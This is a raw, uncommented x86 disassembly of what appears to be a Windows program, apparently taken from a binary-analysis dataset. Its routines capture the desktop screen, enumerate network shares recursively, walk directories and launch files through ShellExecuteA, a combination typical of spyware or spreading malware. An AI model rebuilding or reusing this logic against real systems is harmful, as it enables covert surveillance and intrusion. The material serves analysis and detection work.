mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
push ebp
push sub_49e9e7
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x58 ]
xor edx edx
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x58 ]
lea edx [ ebp - 0x54 ]
call sub_4093d8
cmp [ ebp - 0x54 ] 0x0
je r-xdata
lea ecx [ ebp - 0x64 ]
mov edx 0x1
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x64 ]
lea edx [ ebp - 0x60 ]
call sub_4093d8
cmp [ ebp - 0x60 ] 0x0
je r-xdata
lea ecx [ ebp - 0x5c ]
xor edx edx
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x5c ]
mov eax [ rw-data ]
call sub_404e98
lea ecx [ ebp - 0x70 ]
mov edx 0x2
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x70 ]
lea edx [ ebp - 0x6c ]
call sub_4093d8
cmp [ ebp - 0x6c ] 0x0
je r-xdata
lea ecx [ ebp - 0x68 ]
mov edx 0x1
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x68 ]
mov eax [ rw-data ]
add eax 0x4
call sub_404e98
lea ecx [ ebp - 0x7c ]
mov edx 0x3
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x7c ]
lea edx [ ebp - 0x78 ]
call sub_4093d8
cmp [ ebp - 0x78 ] 0x0
je r-xdata
lea ecx [ ebp - 0x74 ]
mov edx 0x2
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x74 ]
mov eax [ rw-data ]
add eax 0x8
call sub_404e98
lea ecx [ ebp - 0x88 ]
mov edx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x88 ]
lea edx [ ebp - 0x84 ]
call sub_4093d8
cmp [ ebp - 0x84 ] 0x0
je r-xdata
lea ecx [ ebp - 0x80 ]
mov edx 0x3
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x80 ]
mov eax [ rw-data ]
add eax 0x14
call sub_404e98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea ecx [ ebp - 0x8c ]
mov edx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x8c ]
mov eax [ rw-data ]
add eax 0x18
call sub_404e98
mov eax [ ebp - 0x8 ]
call sub_403f64
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x37c ] edx
sub_49ed20
push ebp
mov ebp esp
mov ecx 0x7
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_49eff8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
push [ eax ]
lea eax [ ebp - 0x10 ]
mov edx [ rw-data ]
mov edx [ edx + 0x3c4 ]
call sub_4057bc
push [ ebp - 0x10 ]
lea edx [ ebp - 0x18 ]
mov eax r-xdata
call sub_45ec84
mov edx [ ebp - 0x18 ]
lea eax [ ebp - 0x14 ]
call sub_4057bc
push [ ebp - 0x14 ]
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_405858
mov edx [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
call sub_4050e8
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0x8 ] eax
mov bl 0x1
xor eax eax
push ebp
push sub_49edc6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_403f64
test bl bl
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49efff
lea eax [ ebp - 0x3c ]
mov edx 0xa
call sub_404e68
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_405684
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_4093d8
mov eax [ ebp - 0x20 ]
lea ecx [ ebp - 0x1c ]
mov edx [ rw-data ]
mov edx [ edx + 0x10 ]
call sub_45ee80
lea eax [ ebp - 0x1c ]
mov edx r-xdata
call sub_40512c
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
push ebp
push sub_49efb6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
lea edx [ ebp - 0x38 ]
mov eax r-xdata
call sub_45dfa8
mov edx [ ebp - 0x38 ]
mov eax [ rw-data ]
add eax 0x39c
call sub_404e98
lea edx [ ebp - 0x3c ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x3c ]
mov edx [ rw-data ]
mov edx [ edx + 0x39c ]
call sub_45e5e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
inc esi
xor ebx ebx
mov eax [ ebp - 0x8 ]
call sub_403f64
inc ebx
dec esi
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x39c ]
call sub_409df4
test al al
je r-xdata
lea ecx [ ebp - 0x2c ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x28 ]
call sub_4093d8
mov edx [ ebp - 0x28 ]
mov eax [ rw-data ]
add eax 0x39c
call sub_404e98
mov eax [ rw-data ]
cmp [ eax + 0x39c ] 0x0
je r-xdata
mov eax [ rw-data ]
push [ eax + 0x39c ]
push r-xdata
lea edx [ ebp - 0x34 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x34 ]
mov eax [ rw-data ]
add eax 0x39c
mov edx 0x3
call sub_4051e4
mov eax [ rw-data ]
mov ecx [ eax + 0x39c ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0x20 ]
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x39c ]
call sub_405324
push eax
push 0x0
push 0x0
call ShellExecuteA
mov eax [ rw-data ]
push [ eax + 0x39c ]
push r-xdata
lea edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x30 ]
mov eax [ rw-data ]
add eax 0x39c
mov edx 0x3
call sub_4051e4
mov eax [ rw-data ]
mov ecx [ eax + 0x39c ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0x20 ]
jmp r-xdata
sub_49f094
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_405314
xor eax eax
push ebp
push sub_49f1f7
push [ fs : eax ]
mov [ fs : eax ] esp
call GetDesktopWindow
push eax
call GetDC
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42830c
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_48acec
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_49f1da
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
mov eax [ ebp - 0x8 ]
push eax
call GetDeviceCaps
imul eax eax 0x61
mov ecx 0x64
cdq
idiv ecx
mov edx eax
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0xa
mov eax [ ebp - 0x8 ]
push eax
call GetDeviceCaps
imul eax eax 0x61
mov ecx 0x64
cdq
idiv ecx
mov edx eax
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
push 0x4
mov eax [ ebp - 0xc ]
call sub_4288e0
call sub_42455c
push eax
call SetStretchBltMode
push 0xcc0020
push 0xa
mov eax [ ebp - 0x8 ]
push eax
call GetDeviceCaps
push eax
push 0x8
mov eax [ ebp - 0x8 ]
push eax
call GetDeviceCaps
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x2c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
call sub_4288e0
call sub_42455c
push eax
call StretchBlt
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x10 ]
mov [ eax + 0x3f ] 0x4c
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x50 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49f1e1
mov eax [ ebp - 0x10 ]
call sub_403f64
mov eax [ ebp - 0xc ]
call sub_403f64
mov eax [ ebp - 0x8 ]
push eax
call GetDesktopWindow
push eax
call ReleaseDC
retn
sub_49f204
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_405314
xor eax eax
push ebp
push sub_49f2a1
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0x80000001
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405270
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405270
jne r-xdata
mov ebx 0x80000002
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405270
jne r-xdata
mov ebx 0x80000001
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405270
jne r-xdata
mov ebx 0x80000003
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405270
jne r-xdata
mov ebx 0x80000000
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49f2a8
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov ebx 0x80000005
sub_49f334
push ebp
mov ebp esp
mov ecx 0x38
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_405314
mov eax [ ebp - 0x8 ]
call sub_405314
lea eax [ ebp - 0x178 ]
mov edx [ r-xdata ]
call sub_4059d4
mov esi [ rw-data ]
xor eax eax
push ebp
push sub_49f742
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x18c ]
mov ecx r-xdata
mov edx [ ebp - 0x4 ]
call sub_405170
mov eax [ ebp - 0x18c ]
lea ecx [ ebp - 0x178 ]
mov edx 0x3f
call sub_409fe0
test eax eax
sete bl
jmp r-xdata
test bl bl
jne r-xdata
mov eax [ ebp - 0x164 ]
mov edx r-xdata
call sub_405270
je r-xdata
lea eax [ ebp - 0x178 ]
call sub_40a054
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49f749
lea eax [ ebp - 0x1c4 ]
mov edx 0x3
call sub_404e68
lea eax [ ebp - 0x1b4 ]
mov edx 0x5
call sub_404e68
lea eax [ ebp - 0x1a0 ]
call sub_40566c
lea eax [ ebp - 0x19c ]
mov edx 0x5
call sub_404e68
lea eax [ ebp - 0x178 ]
mov edx [ r-xdata ]
call sub_405aa4
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_404e68
retn
lea eax [ ebp - 0x178 ]
call sub_40a030
test eax eax
sete bl
cmp [ esi ] 0x33
jne r-xdata
mov eax [ ebp - 0x164 ]
mov edx r-xdata
call sub_405270
je r-xdata
inc [ esi ]
push 0x151
call Sleep
xor eax eax
mov [ esi ] eax
mov eax [ ebp - 0x168 ]
and eax 0x10
cmp eax 0x10
jne r-xdata
lea edx [ ebp - 0x194 ]
mov eax [ ebp - 0x4 ]
call sub_4090e4
mov edx [ ebp - 0x194 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_405468
test eax eax
jg r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0x164 ]
lea eax [ ebp - 0x190 ]
mov edx 0x3
call sub_4051e4
mov eax [ ebp - 0x190 ]
mov edx [ ebp - 0x8 ]
call sub_49f334
lea eax [ ebp - 0x1a0 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4057dc
mov ecx eax
dec ecx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx 0x1
call sub_405924
mov edx [ ebp - 0x1a0 ]
lea eax [ ebp - 0x19c ]
call sub_4050e8
mov eax [ ebp - 0x19c ]
lea edx [ ebp - 0x198 ]
call sub_4090e4
mov eax [ ebp - 0x198 ]
push eax
lea edx [ ebp - 0x1a4 ]
mov eax [ ebp - 0x4 ]
call sub_4090e4
mov edx [ ebp - 0x1a4 ]
pop eax
call sub_405468
test eax eax
jg r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0x164 ]
lea eax [ ebp - 0x1a8 ]
mov edx 0x3
call sub_4051e4
mov eax [ ebp - 0x1a8 ]
call sub_409df4
test al al
je r-xdata
mov eax [ rw-data ]
inc [ eax ]
mov [ ebp - 0x179 ] 0x0
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405270
je r-xdata
mov [ ebp - 0x179 ] 0x1
lea edx [ ebp - 0x1ac ]
mov eax [ ebp - 0x164 ]
call sub_40a164
mov eax [ ebp - 0x1ac ]
mov edx [ ebp - 0x8 ]
call sub_405468
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
cmp [ ebp - 0x179 ] 0x0
je r-xdata
mov [ ebp - 0x179 ] 0x1
jmp r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0x164 ]
lea eax [ ebp - 0x1c0 ]
mov edx 0x3
call sub_4051e4
mov eax [ ebp - 0x1c0 ]
lea edx [ ebp - 0xc ]
call sub_45e21c
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0xc ]
call sub_405270
ja r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ rw-data ]
mov edx [ edx ]
call sub_405270
ja r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0x164 ]
lea eax [ ebp - 0x1b0 ]
mov edx 0x3
call sub_4051e4
mov eax [ ebp - 0x1b0 ]
lea edx [ ebp - 0xc ]
call sub_45e21c
lea edx [ ebp - 0x1b4 ]
mov eax r-xdata
call sub_45ec84
mov edi [ ebp - 0x1b4 ]
call sub_40be08
mov eax [ rw-data ]
fild [ eax ]
fsubp st1
fstp [ ebp - 0x188 ]
fwait
push [ ebp - 0x184 ]
push [ ebp - 0x188 ]
lea eax [ ebp - 0x14 ]
mov [ ebp - 0x1b8 ] edi
mov edx [ ebp - 0x1b8 ]
call sub_40ca08
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x14 ]
call sub_404edc
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
call sub_405270
jb r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0x164 ]
lea eax [ ebp - 0x1c4 ]
mov edx 0x3
call sub_4051e4
mov edx [ ebp - 0x1c4 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0x164 ]
lea eax [ ebp - 0x1bc ]
mov edx 0x3
call sub_4051e4
mov edx [ ebp - 0x1bc ]
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
jmp r-xdata
sub_49f7b0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_405314
xor eax eax
push ebp
push sub_49f834
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
xor eax eax
push ebp
push sub_49f812
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_409df4
test al al
je r-xdata
xor ebx ebx
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_405324
push eax
push 0x0
push 0x0
call ShellExecuteA
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49f83b
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_49f86c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_49f974
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
xor edx edx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
lea edx [ ebp - 0x10 ]
call sub_45ebf0
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_4093d8
mov edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffff8
call sub_404edc
mov eax [ rw-data ]
mov eax [ eax + 0x360 ]
mov eax [ eax + 0x270 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
cmp [ ebp - 0x8 ] 0x17
jne r-xdata
inc esi
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49f97b
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_404e68
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov [ ebp - 0x8 ] 0x14
lea edx [ ebp - 0x18 ]
mov eax r-xdata
call sub_45ec84
mov edx [ ebp - 0x18 ]
mov eax [ rw-data ]
add eax 0x398
call sub_404e98
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x384 ] edx
inc ebx
dec esi
jne r-xdata
mov [ ebp - 0x8 ] ebx
jmp r-xdata
lea ecx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax + 0x360 ]
mov eax [ eax + 0x270 ]
mov edx ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_405468
dec eax
jne r-xdata
sub_49f9a8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
lea eax [ ebp - 0x8 ]
push eax
push esi
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call WNetOpenEnumA
test eax eax
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov ebx [ ebp - 0x8 ]
sub_49f9e0
push ebp
mov ebp esp
add esp 0xffffffdc
push esi
push edi
xor edx edx
mov [ ebp - 0x24 ] edx
mov esi eax
lea edi [ ebp - 0x20 ]
mov ecx 0x8
[ edi ] [ esi ]
xor eax eax
push ebp
push sub_49fa7d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0xc ]
add eax 0xfffffff4
mov edx r-xdata
call sub_40512c
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0xc ]
push [ eax - 0x10 ]
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0xc ]
push [ eax - 0xc ]
lea eax [ ebp - 0x24 ]
mov edx [ ebp - 0xc ]
call sub_40503c
push [ ebp - 0x24 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0xc ]
add eax 0xfffffff0
mov edx 0x4
call sub_4051e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49fa84
lea eax [ ebp - 0x24 ]
call sub_404e44
retn
sub_49faa4
push ebp
mov ebp esp
push eax
mov eax 0xf
add esp 0xfffff004
push eax
dec eax
jne r-xdata
mov eax [ ebp - 0x4 ]
add esp 0xfffff5ec
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov esi [ ebp - 0x18 ]
test esi esi
jbe r-xdata
call GetLastError
sub eax 0x1
jb r-xdata
mov [ ebp - 0x14 ] 0xfa00
mov [ ebp - 0x18 ] 0x7d0
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0xfa18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call WNetEnumResourceA
test eax eax
je r-xdata
lea ebx [ ebp - 0xfa18 ]
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub eax 0x102
je r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0xc ]
add eax 0xfffffff4
call sub_404e44
add ebx 0x20
dec esi
jne r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0xc ]
push eax
push ebx
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_49fb70
pop ecx
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
push ebp
mov eax ebx
call sub_49f9e0
pop ecx
test [ ebx + 0xc ] 0x2
je r-xdata
jmp r-xdata
sub_49fb70
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebp + 0x8 ]
call sub_49f9a8
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
push ebp
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_49faa4
pop ecx
sub_49fba8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_405314
xor eax eax
push ebp
push sub_49fcb0
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_49fc93
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_49fc53
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0x4 ]
test ecx ecx
je r-xdata
mov eax ecx
sar eax 0x1
jns r-xdata
sub ecx 0x4
mov ecx [ ecx ]
cdq
push edx
push eax
mov eax [ ebp - 0xc ]
call sub_419344
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx 0x0
jne r-xdata
adc eax 0x0
jle r-xdata
cmp eax 0x0
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
push eax
mov eax [ ebp - 0x4 ]
call sub_405324
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x4 ]
pop ecx
call sub_41d188
jmp r-xdata
push 0x0
push 0x2
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
call sub_405f9c
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_40575c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49fc9a
lea eax [ ebp - 0xc ]
call sub_40f8bc
retn
sub_49fcc0
push ebp
mov ebp esp
mov ecx 0xbb
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
push edi
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
call sub_405314
xor eax eax
push ebp
push sub_4a3319
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x190 ]
mov eax [ ebp - 0x14 ]
call sub_4093d8
mov eax [ ebp - 0x190 ]
mov edx r-xdata
call sub_405270
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a3323
lea eax [ ebp - 0x5d8 ]
mov edx 0x5
call sub_404e68
lea eax [ ebp - 0x5c4 ]
mov edx 0x3
call sub_405684
lea eax [ ebp - 0x5b8 ]
mov edx 0xf
call sub_404e68
lea eax [ ebp - 0x578 ]
call sub_404e44
lea eax [ ebp - 0x574 ]
mov edx 0x3
call sub_405684
lea eax [ ebp - 0x568 ]
call sub_404e44
lea eax [ ebp - 0x564 ]
mov edx 0x3
call sub_405684
lea eax [ ebp - 0x558 ]
mov edx 0x1d
call sub_404e68
lea eax [ ebp - 0x4e4 ]
call sub_40566c
lea eax [ ebp - 0x4e0 ]
call sub_404e44
lea eax [ ebp - 0x4dc ]
mov edx 0x3
call sub_405684
lea eax [ ebp - 0x4d0 ]
mov edx 0xc
call sub_404e68
lea eax [ ebp - 0x4a0 ]
mov edx 0x3
call sub_405684
lea eax [ ebp - 0x494 ]
mov edx 0x13
call sub_404e68
lea eax [ ebp - 0x444 ]
call sub_404e44
lea eax [ ebp - 0x448 ]
call sub_404e44
lea eax [ ebp - 0x440 ]
mov edx 0x62
call sub_404e68
lea eax [ ebp - 0x2b4 ]
call sub_404e44
lea eax [ ebp - 0x2b8 ]
call sub_404e44
lea eax [ ebp - 0x2b0 ]
mov edx 0xf
call sub_404e68
lea eax [ ebp - 0x274 ]
call sub_40566c
lea eax [ ebp - 0x270 ]
mov edx 0x2
call sub_404e68
lea eax [ ebp - 0x268 ]
call sub_40566c
lea eax [ ebp - 0x264 ]
mov edx 0x7
call sub_404e68
lea eax [ ebp - 0x248 ]
call sub_40566c
lea eax [ ebp - 0x244 ]
mov edx 0x3
call sub_404e68
lea eax [ ebp - 0x238 ]
call sub_40566c
lea eax [ ebp - 0x234 ]
mov edx 0x2
call sub_404e68
lea eax [ ebp - 0x22c ]
call sub_40566c
lea eax [ ebp - 0x228 ]
mov edx 0xf
call sub_404e68
lea eax [ ebp - 0x1ec ]
call sub_40566c
lea eax [ ebp - 0x1e8 ]
mov edx 0x2
call sub_404e68
lea eax [ ebp - 0x1e0 ]
call sub_40566c
lea eax [ ebp - 0x1dc ]
mov edx 0x4
call sub_404e68
lea eax [ ebp - 0x1cc ]
call sub_40566c
lea eax [ ebp - 0x1c8 ]
mov edx 0x4
call sub_404e68
lea eax [ ebp - 0x1b8 ]
call sub_40566c
lea eax [ ebp - 0x1b4 ]
mov edx 0xa
call sub_404e68
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
call sub_406410
lea eax [ ebp - 0x1c ]
mov edx 0x6
call sub_404e68
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor edx edx
push ebp
push sub_4a30de
push [ fs : edx ]
mov [ fs : edx ] esp
or ebx 0xffffffff
lea eax [ ebp - 0x14 ]
call sub_404e44
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
test ebx ebx
jle r-xdata
inc eax
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x34 ] 0x0
lea ecx [ ebp - 0x1c4 ]
mov edx [ rw-data ]
mov edx [ edx + 0x10 ]
mov eax [ ebp - 0x14 ]
call sub_45ee80
mov edx [ ebp - 0x1c4 ]
lea eax [ ebp - 0x14 ]
call sub_404edc
lea edx [ ebp - 0x1d0 ]
mov eax [ ebp - 0x14 ]
call sub_4093d8
mov eax [ ebp - 0x1d0 ]
lea edx [ ebp - 0x1cc ]
call sub_49fba8
mov edx [ ebp - 0x1cc ]
lea eax [ ebp - 0x1c8 ]
call sub_4050e8
mov edx [ ebp - 0x1c8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
test ebx ebx
jl r-xdata
lea ecx [ ebp - 0x1b0 ]
mov edx [ rw-data ]
mov edx [ edx + 0x10 ]
mov eax [ ebp - 0x14 ]
call sub_45ee80
mov edx [ ebp - 0x1b0 ]
lea eax [ ebp - 0x14 ]
call sub_404edc
mov ebx [ ebp - 0x34 ]
jmp r-xdata
